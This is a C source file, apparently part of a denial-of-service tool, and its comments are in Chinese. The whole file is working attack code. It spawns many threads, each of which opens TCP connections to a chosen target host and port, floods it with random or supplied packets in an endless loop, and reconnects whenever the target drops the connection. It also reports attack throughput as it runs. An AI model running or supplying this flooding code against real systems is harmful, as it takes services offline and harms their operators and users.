//  dos.c

#include "dos.h"
#include "util.h"

#include <math.h>
#include <stdio.h>

#ifndef DOUBLE_MAX
#define DOUBLE_MAX 0.0
#endif


//这次发送数据包的数量
double psent;

//攻击目标IP
char* __host;

//攻击目标端口
int __port;

// 线程数
int tcount = 0;

//互斥信号量
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

//是否在标准输出上展示攻击数据信息
bool status;

//衡量数据包的单位 1:表示B, 2:表示KB ...
uint8_t metrics;

//所选指标（单位）中的一个数据包大小
double psize;

// 是否还在运行
bool __run;

//用来计算速度
uint64_t pc;

//一个数据包的字节数
int64_t plen;

//上一次更新状态的时间
clock_t tm;



// 数据包单位 "B" "KB" "MB" "GB" "TB"
char *smetrics;

//上衣发送的数据包数量
double psent_old;

//退出线程
void __exit()
{
    __run = false;
    pthread_mutex_lock(&mutex);
    fflush(stdout);
    printf("%c[2K", 27);
    printf("\r");
    success("Total data sent:%.2f%s",psent,smetrics);
    info("Quitting...");
    pthread_mutex_unlock(&mutex);
    exit(0);
}

//用来Debug
void __perror(){
    __run = false;
    pthread_mutex_lock(&mutex);
    printf("%c[2K", 27);
    printf("\r");
    error("Programming error:Abort trap(6):maybe type overflow?");
    pthread_mutex_unlock(&mutex);
    exit(-1);
}


void _dos_tcp(char* host, int port, char* packet)
{
    tcount++;
    
    bool RAND_PACKET = (packet == NULL);

    
    if (port == 0) {
        port = randport();
    }
    
    //创建TCP连接
    int sock = dos_tcp_sock(host, port);
    if (sock < 0) {
        pthread_mutex_lock(&mutex);
        fflush(stdout);
        error("Connection failure");
        error("Quitting thread!");
        pthread_mutex_unlock(&mutex);
        return;
    }

    //申请接受数据缓冲区
    char* buf = (char*)malloc(1024 * sizeof(buf));
    size_t _bufsize = 1024 * sizeof(buf);

    while(1) 
    {
        
        if (!__run) {
            shutdown(sock, 2);
            close(sock);
            break;
        }

        if(sock<0){
            dperror("Failed to open socket");
        }

        //随机生成一个数据包
        if (RAND_PACKET) {
            packet = randstring(randrange(64, 2048));
        }

        //向目标发送数据包
        if (dos_tcp_send_noalloc(sock, packet, buf, _bufsize)) {
            int _error = 0;
            socklen_t len = sizeof(error);

            //getsockopt()函数用于获取任意类型、任意状态套接口的选项当前值
            //SO_ERROR获取错误状态
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &_error, &len);
            
            if (_error != 0) {
                pthread_mutex_lock(&mutex);
                shutdown(sock, 2);
                fflush(stdout);
                warning("Socket disconnected.");
                info("Attempting to reconnect tcp sock");
                shutdown(sock, 2);
                close(sock);
                sock = dos_tcp_sock(host, port);
                pthread_mutex_unlock(&mutex);
            }
        }

        if(status){
            psent+=psize;
            pc++;
        }
    }

    tcount--;
}

//更新状态
void _dos_stat()//update status
{
    success("Status:");
    success("Hit ^C to exit");
    while(1) 
    {
        clock_t now=clock();
        double delta_t=(double)(now - tm) / CLOCKS_PER_SEC;//time diff
        double delta_p=psent-psent_old;
        if (!__run) {
            break;
        }
        success_n("DOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
        pc=0;
    }

}

// 将攻击参数 host ip packet mode 打包
_dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
{
    _dos_param* p = malloc(sizeof(_dos_param) + (strlen(host) + strlen(packet)) * sizeof(char));
    p->host = host;
    p->port = port;
    p->packet = packet;
    p->mode = mode;
    return p;
}

// 调用 _dos_tcp
void __dos_wrapper(_dos_param* x)
{
    if (x->mode == MODE_TCP) {
        _dos_tcp(x->host, x->port, x->packet);
    }else {
        error("Bad wrapper descriptor!");
        assert(false);
    }
}


void dos(char* host, int port, char* packet, int _tcount, int mode)
{
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, __exit);
    signal(SIGABRT, __perror);
    
    pc = 0;
    plen=strlen(packet);
    psize=plen/pow(1024.0,metrics);
    __run = true;
    smetrics=metrics2str(metrics);
    __host = host;
    __port = port;
    psent_old=0.0;
    psent=0.0;

    _dos_param* p = _init_dos_p(host, port, packet, mode);
    pthread_t* _dos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));

    if(status && mode != MODE_MEMCRASHED){
        pthread_create(&_dos[0], NULL, (void*)_dos_stat, NULL);
        status=1;
    }else{
        success("Hit ^C to exit");
        success("DOSing target %s",host);
    }
    
    for (int i = status; i < _tcount + 1; i++) {
        if (pthread_create(&_dos[i], NULL, (void*)__dos_wrapper, p)) {
            error("Failed to create thread #%d!", i);
            continue;
        }
    }
    
    pthread_join(_dos[_tcount], NULL);
}
